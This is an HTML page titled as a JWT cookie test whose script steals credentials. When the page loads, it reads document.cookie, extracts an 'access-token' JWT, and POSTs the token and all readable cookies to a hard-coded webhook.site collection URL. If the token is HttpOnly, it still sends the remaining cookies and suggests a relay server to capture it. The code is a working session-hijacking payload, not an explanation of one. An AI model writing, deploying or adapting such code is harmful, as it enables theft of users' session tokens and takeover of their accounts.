<!DOCTYPE html>
<html>
<head>
    <title>JWT Cookie Test</title>
</head>
<body>
    <h1>Testing JWT Cookie Access...</h1>
    <pre id="output"></pre>
    
    <script>
        const output = document.getElementById('output');
        const EXFIL = 'https://webhook.site/23b9c460-f601-4ae9-aca0-80a40aedd5d3';
        
        // Check if we can read the JWT directly
        const allCookies = document.cookie;
        
        output.textContent = 'All cookies:\n' + allCookies + '\n\n';
        
        // Try to find access-token
        if (allCookies.includes('access-token')) {
            const match = allCookies.match(/access-token=([^;]+)/);
            if (match) {
                const jwt = match[1];
                output.textContent += '✅ SUCCESS! JWT found:\n' + jwt + '\n\n';
                
                // Exfiltrate
                fetch(EXFIL, {
                    method: 'POST',
                    mode: 'no-cors',
                    body: JSON.stringify({
                        success: true,
                        jwt: jwt,
                        timestamp: new Date().toISOString(),
                        allCookies: allCookies
                    })
                });
                
                output.textContent += 'JWT sent to webhook!';
            }
        } else {
            output.textContent += '❌ JWT cookie not found in document.cookie\n';
            output.textContent += 'This means it is HttpOnly.\n\n';
            output.textContent += 'You will need a relay server to capture it.';
            
            // Still send diagnostic info
            fetch(EXFIL, {
                method: 'POST',
                mode: 'no-cors',
                body: JSON.stringify({
                    success: false,
                    reason: 'JWT not in document.cookie - likely HttpOnly',
                    allCookies: allCookies,
                    timestamp: new Date().toISOString()
                })
            });
        }
    </script>
</body>
</html>
